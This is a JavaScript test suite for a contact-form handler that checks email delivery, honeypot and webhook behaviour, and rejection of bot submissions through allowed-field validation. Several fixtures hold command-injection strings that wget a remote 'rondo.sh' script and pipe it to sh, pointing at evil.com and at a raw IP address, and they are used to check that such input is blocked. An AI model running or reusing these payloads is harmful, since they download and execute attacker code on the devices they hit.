import assert from 'assert';
import { handleForm } from '../lib/post.js';
import { parseAllowedFields, validateAllowedFields } from '../lib/validate.js';
import { getNextEmail, setupMailDev } from './setupMailDev.js';
import http from 'http';

describe('handleForm', function () {
  const smtpPort = 1025;
  let maildev;
  before(async function () {
    maildev = await setupMailDev({
      smtp: smtpPort,
      web: 1080,
    });
  });

  after(function () {
    maildev.close();
  });

  it('should call sendmmail with the form data', async function () {
    const email = 'alex@test.com';
    const name = 'Alex';

    // Process the form
    await handleForm({
      name,
      email,
    }, undefined, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
    })

    // Wait for email to be received
    const received = await getNextEmail();

    // Assertions
    assert.ok(received, 'Email should be defined');
    assert.strictEqual(received.subject, 'New form submission on your website', 'Subject should match');
    assert.strictEqual(received.html.includes(name), true, 'Name should be in the email');
    assert.strictEqual(received.html.includes(email), true, 'Name should be in the email');
  });

  it('should use the referer in the title', async function () {
    const referer = 'https://example.com';
    await handleForm({}, referer, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
    })

    // Wait for email to be received
    const received = await getNextEmail();

    // Assertions
    assert.ok(received, 'Email should be defined');
    assert.strictEqual(received.subject, `New form submission on ${referer}`, 'Subject should match');
    assert.strictEqual(received.html.includes(referer), true, 'Name should be in the email');
  });

  it('should use the site field in the title', async function () {
    const referer = 'https://example.com';
    const site = 'My Site';
    await handleForm({
      site,
    }, referer, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
      siteField: 'site',
    })

    // Wait for email to be received
    const received1 = await getNextEmail();

    // Assertions
    assert.ok(received1, 'Email should be defined');
    assert.strictEqual(received1.subject, `New form submission on ${site}`, 'Subject should match');
    assert.strictEqual(received1.html.includes(referer), false, 'Referer should be in the email');
    assert.strictEqual(received1.html.includes(site), true, 'Site should be in the email');

    // Now without referer
    await handleForm({
      site,
    }, undefined, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
      siteField: 'site',
    })

    // Wait for email to be received
    const received2 = await getNextEmail();

    // Assertions
    assert.ok(received2, 'Email should be defined');
    assert.strictEqual(received2.subject, `New form submission on ${site}`, 'Subject should match');
    assert.strictEqual(received2.html.includes(referer), false, 'Referer should be in the email');
    assert.strictEqual(received2.html.includes(site), true, 'Site should be in the email');
  });

  it('should not send an email if the honeypot field is filled', async function () {
    await handleForm({
      email: 'alex@test.com',
      phone: '1234567890',
    }, undefined, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
      honeyField: 'phone',
    })

    const received = await getNextEmail();
    assert.strictEqual(received, undefined, 'Email should not be defined');
  });

  it('should call the hook with the form data', async function () {
    const email = 'alex@test.com';
    const honey = 'Alex';
    const hook = {
      url: 'http://localhost:3000',
      method: 'POST',
      headers: {
        'Authorization': 'test',
        'Content-Type': 'application/json',
      },
    };
    let receivedData;
    let receivedHeaders;
    const server = await new Promise((resolve) => {
      // Listen for the hook
      const server = http.createServer((req, res) => {
        // get the request body from IncomingMessage
        let data = '';
        req.on('data', (chunk) => {
          data += chunk;
        });
        req.on('end', () => {
          res.end();
          receivedData = JSON.parse(data.toString());
        });
        receivedHeaders = req.headers;
        res.end();
      });
      server.listen(3000, () => resolve(server));
    });
    // Process the form
    await handleForm({
      honey,
      email,
      token: 'tokenTest',
    }, undefined, {
      mail: {
        host: 'localhost',
        port: smtpPort,
      },
      to: 'alex@test.com',
      hook: {
        'tokenTest': hook,
      },
      honeyField: 'honey',
      tokenField: 'token',
    }, 'headers');
    // Wait for hook to be received
    await new Promise((resolve) => setTimeout(resolve, 100));
    // Stop the server after the test
    server.close();
    // Assertions
    assert.ok(receivedData, 'Data should be defined');
    assert.strictEqual(receivedData.email, email, 'Email should match');
    assert.ok(receivedHeaders, 'Headers should be defined');
    assert.strictEqual(receivedHeaders.authorization, 'test', 'Headers should match');

  });
});

describe('validateAllowedFields', function () {

  it('should pass when no allowedFields is configured', function () {
    const result = validateAllowedFields({ mac: ';wget ...' }, {});
    assert.strictEqual(result.valid, true);
  });

  it('should pass a valid form with global allowedFields', function () {
    const result = validateAllowedFields(
      { name: 'Robert', email: 'r@test.com', message: 'hello' },
      { allowedFields: ['name', 'email', 'message'] }
    );
    assert.strictEqual(result.valid, true);
  });

  it('should reject a bot form with unknown fields (global allowedFields)', function () {
    const result = validateAllowedFields(
      { mac: ';wget -qO- http://evil.com/rondo.sh|sh&#' },
      { allowedFields: ['name', 'email', 'message'] }
    );
    assert.strictEqual(result.valid, false);
    assert.ok(result.errors[0].includes('mac'));
  });

  it('should reject a bot form with foreign fields (global allowedFields)', function () {
    const fields = {
      submit_button: '',
      change_action: '',
      action: '',
      commit: '0',
      ttcp_num: '2',
      ttcp_size: '2',
      ttcp_ip: '-h `busybox wget -qO- http://evil.com/rondo.sh|sh`',
      StartEPI: '1',
    };
    const result = validateAllowedFields(fields, { allowedFields: ['name', 'email', 'message'] });
    assert.strictEqual(result.valid, false);
  });

  it('should pass a valid form with per-token allowedFields (string)', function () {
    const result = validateAllowedFields(
      { name: 'Robert', company: 'google', email: 'r@test.com', message: 'hi', submit: '', token: 'TBEoZo2EfdVFhak5', thanks: 'https://example.com/thanks/' },
      {
        allowedFields: 'TBEoZo2EfdVFhak5:name,company,email,message,submit',
        tokenField: 'token',
        thanksField: 'thanks',
        siteField: 'site',
        honeyField: 'email2',
      }
    );
    assert.strictEqual(result.valid, true);
  });

  it('should reject a bot form with per-token allowedFields (string)', function () {
    const result = validateAllowedFields(
      { mac: ';wget ...', token: 'TBEoZo2EfdVFhak5' },
      {
        allowedFields: 'TBEoZo2EfdVFhak5:name,company,email,message,submit',
        tokenField: 'token',
        thanksField: 'thanks',
        siteField: 'site',
        honeyField: 'email2',
      }
    );
    assert.strictEqual(result.valid, false);
    assert.ok(result.errors[0].includes('mac'));
  });

  it('should reject when token has no configured allowed list', function () {
    const result = validateAllowedFields(
      { name: 'test', token: 'UNKNOWN_TOKEN' },
      {
        allowedFields: 'TBEoZo2EfdVFhak5:name,email',
        tokenField: 'token',
      }
    );
    assert.strictEqual(result.valid, false);
  });
});

describe('parseAllowedFields', function () {

  it('should parse a global comma-separated list', function () {
    const result = parseAllowedFields('name,email,message,submit');
    assert.deepStrictEqual(result, ['name', 'email', 'message', 'submit']);
  });

  it('should parse a per-token semicolon-separated map', function () {
    const result = parseAllowedFields('TOKEN1:name,email;TOKEN2:name,phone,email');
    assert.deepStrictEqual(result, {
      TOKEN1: ['name', 'email'],
      TOKEN2: ['name', 'phone', 'email'],
    });
  });
});

describe('handleForm with allowedFields', function () {
  const smtpPort = 1025;
  let maildev;
  before(async function () {
    maildev = await setupMailDev({ smtp: smtpPort, web: 1080 });
  });
  after(function () {
    maildev.close();
  });

  it('should NOT send email when bot fields are present', async function () {
    await handleForm(
      { mac: ';wget -qO- http://204.10.194.134/rondo.sh|sh&#', time1: '00:00-00:00' },
      undefined,
      {
        mail: { host: 'localhost', port: smtpPort },
        to: 'admin@test.com',
        allowedFields: ['name', 'email', 'message'],
      }
    );
    const received = await getNextEmail();
    assert.strictEqual(received, undefined, 'No email should be sent for bot form');
  });

  it('should send email when valid form passes allowedFields check', async function () {
    await handleForm(
      { name: 'RobertNAF', company: 'google', email: 'zekisuquc419@gmail.com', message: 'Szia' },
      'https://example.com',
      {
        mail: { host: 'localhost', port: smtpPort },
        to: 'admin@test.com',
        allowedFields: ['name', 'company', 'email', 'message'],
      }
    );
    const received = await getNextEmail();
    assert.ok(received, 'Email should be sent for valid form');
    assert.ok(received.html.includes('RobertNAF'));
  });
});
